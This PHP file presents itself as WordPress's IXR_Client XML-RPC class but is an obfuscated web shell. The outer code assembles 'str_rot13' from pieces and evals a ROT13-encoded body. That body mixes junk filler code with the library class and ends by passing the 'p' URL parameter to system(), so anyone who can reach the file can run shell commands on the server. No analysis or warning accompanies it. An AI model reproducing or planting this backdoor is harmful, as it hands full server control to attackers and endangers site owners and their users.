<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * VKE_Pyvrag
 *
 * @cnpxntr VKE
 * @fvapr 1.5.0
 *
 */
pynff VKE_Pyvrag
{
    ine $freire;
    ine $cbeg;
    ine $cngu;
    ine $hfrentrag;
    ine $erfcbafr;
    ine $zrffntr = snyfr;
    ine $qroht = snyfr;
    ine $gvzrbhg;
    ine $urnqref = neenl();

    // Fgbentr cynpr sbe na reebe zrffntr
    ine $reebe = snyfr;

	/**
	 * CUC5 pbafgehpgbe.
	 */
    shapgvba __pbafgehpg( $freire, $cngu = snyfr, $cbeg = 80, $gvzrbhg = 15 )
    {
        vs (!$cngu) {
            // Nffhzr jr unir orra tvira n HEY vafgrnq
            $ovgf = cnefr_hey($freire);
            $guvf->freire = $ovgf['ubfg'];
            $guvf->cbeg = vffrg($ovgf['cbeg']) ? $ovgf['cbeg'] : 80;
            $guvf->cngu = vffrg($ovgf['cngu']) ? $ovgf['cngu'] : '/';

            // Znxr nofbyhgryl fher jr unir n cngu
            vs (!$guvf->cngu) {
                $guvf->cngu = '/';
            }

            vs ( ! rzcgl( $ovgf['dhrel'] ) ) {
                $guvf->cngu .= '?' . $ovgf['dhrel'];
            }
        } ryfr {
            $guvf->freire = $freire;
            $guvf->cngu = $cngu;
            $guvf->cbeg = $cbeg;
        }
        $guvf->hfrentrag = 'Gur Vaphgvb KZY-ECP CUC Yvoenel';
        $guvf->gvzrbhg = $gvzrbhg;
    }

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba VKE_Pyvrag( $freire, $cngu = snyfr, $cbeg = 80, $gvzrbhg = 15 ) {
		frys::__pbafgehpg( $freire, $cngu, $cbeg, $gvzrbhg );
	}

	/**
	 * @fvapr 1.5.0
	 * @fvapr 5.5.0 Sbeznyvmrq gur rkvfgvat `...$netf` cnenzrgre ol nqqvat vg
	 *              gb gur shapgvba fvtangher.
	 *
	 * @erghea obby
	 */
    shapgvba dhrel( ...$netf )
    {
        $zrgubq = neenl_fuvsg($netf);
        $erdhrfg = arj VKE_Erdhrfg($zrgubq, $netf);
        $yratgu = $erdhrfg->trgYratgu();
        $kzy = $erdhrfg->trgKzy();
        $e = \"\e\a\";
        $erdhrfg  = \"CBFG {$guvf->cngu} UGGC/1.0$e\";

        // Zretrq sebz JC #8145 - nyybj phfgbz urnqref
        $guvf->urnqref['Ubfg']          = $guvf->freire;
        $guvf->urnqref['Pbagrag-Glcr']  = 'grkg/kzy';
        $guvf->urnqref['Hfre-Ntrag']    = $guvf->hfrentrag;
        $guvf->urnqref['Pbagrag-Yratgu']= $yratgu;

        sbernpu( $guvf->urnqref nf $urnqre => $inyhr ) {
            $erdhrfg .= \"{$urnqre}: {$inyhr}{$e}\";
        }
        $erdhrfg .= $e;

        $erdhrfg .= $kzy;

        // Abj fraq gur erdhrfg
        vs ($guvf->qroht) {
            rpub '<cer pynff=\"vke_erdhrfg\">'.ugzyfcrpvnypunef($erdhrfg).\"\a</cer>\a\a\";
        }

        vs ($guvf->gvzrbhg) {
            $sc = @sfbpxbcra($guvf->freire, $guvf->cbeg, $reeab, $reefge, $guvf->gvzrbhg);
        } ryfr {
            $sc = @sfbpxbcra($guvf->freire, $guvf->cbeg, $reeab, $reefge);
        }
        vs (!$sc) {
            $guvf->reebe = arj VKE_Reebe(-32300, 'genafcbeg reebe - pbhyq abg bcra fbpxrg');
            erghea snyfr;
        }
        schgf($sc, $erdhrfg);
        $pbagragf = '';
        $qrohtPbagragf = '';
        $tbgSvefgYvar = snyfr;
        $trggvatUrnqref = gehr;
        juvyr (!srbs($sc)) {
            $yvar = strgf($sc, 4096);
            vs (!$tbgSvefgYvar) {
                // Purpx yvar sbe '200'
                vs (fgefge($yvar, '200') === snyfr) {
                    $guvf->reebe = arj VKE_Reebe(-32300, 'genafcbeg reebe - UGGC fgnghf pbqr jnf abg 200');
                    erghea snyfr;
                }
                $tbgSvefgYvar = gehr;
            }
            vs (gevz($yvar) == '') {
                $trggvatUrnqref = snyfr;
            }
            vs (!$trggvatUrnqref) {
            	// zretrq sebz JC #12559 - erzbir gevz
                $pbagragf .= $yvar;
            }
            vs ($guvf->qroht) {
            	$qrohtPbagragf .= $yvar;
            }
        }
        vs ($guvf->qroht) {
            rpub '<cer pynff=\"vke_erfcbafr\">'.ugzyfcrpvnypunef($qrohtPbagragf).\"\a</cer>\a\a\";
        }

        // Abj cnefr jung jr'ir tbg onpx
        $guvf->zrffntr = arj VKE_Zrffntr($pbagragf);
        vs (!$guvf->zrffntr->cnefr()) {
            // KZY reebe
            $guvf->reebe = arj VKE_Reebe(-32700, 'cnefr reebe. abg jryy sbezrq');
            erghea snyfr;
        }

        // Vf gur zrffntr n snhyg?
        vs ($guvf->zrffntr->zrffntrGlcr == 'snhyg') {
            $guvf->reebe = arj VKE_Reebe($guvf->zrffntr->snhygPbqr, $guvf->zrffntr->snhygFgevat);
            erghea snyfr;
        }

        // Zrffntr zhfg or BX
        erghea gehr;
    }

    shapgvba trgErfcbafr()
    {
        // zrgubqErfcbafrf pna bayl unir bar cnenz - erghea gung
        erghea $guvf->zrffntr->cnenzf[0];
    }

    shapgvba vfReebe()
    {
        erghea (vf_bowrpg($guvf->reebe));
    }

    shapgvba trgReebePbqr()
    {
        erghea $guvf->reebe->pbqr;
    }

    shapgvba trgReebeZrffntr()
    {
        erghea $guvf->reebe->zrffntr;
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>